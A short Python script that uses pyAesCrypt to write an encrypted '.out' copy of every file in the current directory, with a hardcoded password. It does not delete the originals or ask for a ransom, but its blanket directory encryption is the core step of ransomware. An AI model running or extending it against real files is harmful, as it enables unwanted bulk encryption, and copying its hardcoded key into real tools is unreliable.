import pyAesCrypt 
import os

files = os.listdir() #get files in directory

def main():
	passw = "solstice" #password
	bufferSize = 64 * 1024 
	for file in files:
		try:
			pyAesCrypt.encryptFile(file, file + ".out", passw, bufferSize)
			print("Encrypted")
		except:
			print("unsucessful")

if __name__ == "__main__":
	main()
